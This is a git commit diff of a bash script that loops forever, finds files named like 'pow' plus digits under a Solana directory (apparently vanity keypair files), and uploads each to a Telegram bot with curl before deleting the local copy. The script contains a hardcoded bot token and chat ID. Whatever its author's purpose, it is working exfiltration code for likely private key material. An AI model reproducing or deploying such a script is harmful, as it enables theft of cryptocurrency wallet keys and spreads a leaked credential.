345fce9b989af19e8f2133e0ac8b72527db8daf4
Sheryna1 <75541035+Sheryna1@users.noreply.github.com>
2024-02-09 03:05:48 +0200

    Update script.sh

--- script.sh
+++ script.sh
@@ -1,32 +1,30 @@
 #!/bin/bash
 
-# Function to URL encode the content
-urlencode() {
-    # Usage: urlencode "string"
-    local string="$1"
-    echo -n "$string" | xxd -plain | tr -d '\n' | sed 's/\(..\)/%\1/g'
-}
+
 while true; do
+
     # Execute the find command and store the result in the "result" variable
     result=$(find . -type f -name 'pow[0-9][0-9][0-9][0-9]*')
 
     # Check if there are any results
     if [ -n "$result" ]; then
         # Loop through each result
-        while IFS= read -r file; do
+        for file in $result; do
             # Output the content of the file
-            cat "$file"
+            # cat "$file"
             # Get the content of the file
-            content=$(cat "$file")
+            # content=$(cat "$file")
             # Encode the content for the URL
-            encoded_content=$(urlencode "$content")
+            # encoded_content=$(urlencode "$content")
             # Get the filename
             filename=$(basename "$file")
 
-            # rm $filename
+            
+
             # Make a curl GET request with the content of the file appended to the URL
-            curl -X GET "https://api.telegram.org/bot6851381197:AAHJ5Yy7iqn_psValJJa1hZ71n8KSKEZ5U4/sendMessage?chat_id=638066999&text=1$filename$encoded_content"
-        done <<< "$result"
+            curl -v -F "chat_id=638066999" -F document=@/root/solana/$filename https://api.telegram.org/bot6851381197:AAHJ5Yy7iqn_psValJJa1hZ71n8KSKEZ5U4/sendDocument
+            rm $filename
+        done
     fi
 
     # Sleep for 5 seconds before the next iteration
